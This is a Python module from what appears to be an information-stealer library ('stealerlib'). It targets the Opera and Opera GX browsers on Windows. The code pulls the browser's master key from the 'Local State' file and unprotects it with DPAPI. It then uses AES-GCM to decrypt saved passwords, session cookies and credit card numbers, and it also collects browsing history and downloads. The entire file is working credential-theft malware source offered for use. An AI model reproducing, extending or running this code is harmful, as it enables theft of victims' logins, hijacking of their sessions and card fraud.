#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/opera.py
"""

from stealerlib.browser import *
from stealerlib.browser.types import BrowserTypes


class Opera:
    """This class provides methods for extracting and decrypting information from Opera based Web Browser databases

    Attributes:
        roaming     The local filepath for the ROAMING APPDATA folder
        paths       A dictionary containing the name and local file path for each Opera-based browser

        opera_passwords  A list of (site_url, username, password) lists for each saved password
        opera_downloads  A list of (tab_url, local_path) lists for each saved download
        opera_cookies    A list of (site_url, title, timestamp) lists for each saved cookie
        opera_history    A list of (host, name, path, value, expires?, expire_date) lists for each site in the saved history
        opera_banking    A list of (name, month, year, number, date_modified) lists for each saved bank card
    """

    def __init__(self):
        self.roaming = os.getenv("APPDATA")
        self.paths = {
            'operagx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'opera': self.roaming + '\\Opera Software\\Opera Stable'
        }

        self.opera_passwords = []
        self.opera_downloads = []
        self.opera_cookies = []
        self.opera_history = []
        self.opera_banking = []

    def oget(self, func: callable, conv: Optional[bool]=True) -> list:
        temp_data = []

        for _, path in self.paths.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_encryption_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            data = func(path, conv)
            temp_data.append(data)

        return temp_data

    @staticmethod
    def get_encryption_key(path: str) -> bytes:
        """Retrieves the master encryption key used to encrypt the user's data

        Parameters:
            path (str): The browser path to get the encryption key from

        Returns:
            bytes: The encryption key we'll use to decrypt the user's passwords
        """

        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

    @staticmethod
    def decrypt_password(buff: bytes, master_key: bytes) -> str:
        """Decrypts an encrypted password using the given encryption key

        Parameters:
            password (str): The encrypted password to decrypt
            key (str): The master key to use for the decryption

        Returns:
            str: The decrypted password
        """

        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def _opera_passwords(self, path: str, conv: Optional[bool]=True) -> list:
        """Retrieves the site url, username and password from the passed Opera browser by connecting to its database file -
           and decrypting the passwords using the encryption key

        Parameters:
            self (object): The object passed to the method
            path (str): Opera browser path to get the passwords from
            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object

        Returns:
            list: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 

        Example:
            opera = Opera()
            opera._opera_passwords()
        """

        login_db = f'{path}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            url, username, password_enc = row
            password = self.decrypt_password(password_enc, self.master_key)
            obj_login = BrowserTypes.Login(url, username, password)

            self.opera_passwords.append(
                obj_login.conv() if conv else obj_login
            )

        cursor.close()
        conn.close()
        os.remove('login_db')

        return self.opera_passwords

    def _opera_cookies(self, path: str, conv: Optional[bool]=True) -> list:
        """Retrieves the site host, cookie name, value and various other information from the passed Opera browser -
           by connecting to its database file and decrypting the cookies using the derived encryption key (from path)

        Parameters:
            self (object): The object passed to the method
            path (str): Opera browser path to get the cookie information from
            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object

        Returns:
            list: list of (host, name, path, value, expires?, expire_date) lists (derived from BrowserTypes conv()) 

        Example:
            opera = Opera()
            opera._opera_cookies()
        """

        cookies_db = f'{path}\\Network\\Cookies'
        if not os.path.exists(cookies_db):
            return

        shutil.copy(cookies_db, 'cookies_db')
        conn = sqlite3.connect('cookies_db')
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            row = [x.decode('latin-1') if isinstance(x, bytes) else x for x in row]

            host, name, path, enc_val, expires = row
            value = self.decrypt_password(enc_val, self.master_key)
            obj_cookie = BrowserTypes.Cookie(host, name, path, value, expires)

            self.opera_cookies.append(
                obj_cookie.conv() if conv else obj_cookie
            )

        cursor.close()
        conn.close()
        os.remove('cookies_db')

        return self.opera_cookies

    def _opera_history(self, path: str, conv: Optional[bool]=True) -> list:
        """Retrieves the site url, tab title and timestamp (when visited) for each site in the users history from the passed Opera browser -
           by connecting to its database file and parsing the needed data

        Parameters:
            self (object): The object passed to the method
            path (str): Opera browser path to get the web history from
            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object

        Returns:
            list: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 

        Example:
            opera = Opera()
            opera._opera_history()
        """

        history_db = f'{path}\\History'
        if not os.path.exists(history_db):
            return

        shutil.copy(history_db, 'history_db')
        conn = sqlite3.connect('history_db')
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls")

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            url, title, timestamp = row
            obj_site = BrowserTypes.Site(url, title, timestamp)

            self.opera_history.append(
                obj_site.conv() if conv else obj_site
            )

        cursor.close()
        conn.close()
        os.remove('history_db')

        return self.opera_history

    def _opera_downloads(self, path: str, conv: Optional[bool]=True) -> list:
        """Retrieves the site url and the target path (where the file was saved locally) for each site in the users downloads from the passed Opera browser -
           by connecting to its database file and parsing the needed data

        Parameters:
            self (object): The object passed to the method
            path (str): Opera browser path to get the download history from
            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object

        Returns:
            list: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 

        Example:
            opera = Opera()
            opera._opera_downloads()
        """

        downloads_db = f'{path}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')

        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            obj_download = BrowserTypes.Download(row[0], row[1])
            self.opera_downloads.append(
                obj_download.conv() if conv else obj_download
            )

        cursor.close()
        conn.close()
        os.remove('downloads_db')

        return self.opera_downloads

    def _opera_credit_cards(self, path: str, conv: Optional[bool]=True) -> list:
        """Retrieves the card number and its related information for each bank card in the users saved cards from the passed Opera browser -
           by connecting to its database file and parsing the needed data

        Parameters:
            self (object): The object passed to the method
            path (str): Opera browser path to get the bank cards from from
            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object

        Returns:
            list: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 

        Example:
            opera = Opera()
            opera._opera_credit_cards()
        """

        cards_db = f'{path}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3] or not row[4]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            obj_card = BrowserTypes.Card(row[0], row[1], row[2], card_number, row[4])

            self.opera_banking.append(
                obj_card.conv() if conv else obj_card
            )

        cursor.close()
        conn.close()
        os.remove('cards_db')

        return self.opera_banking
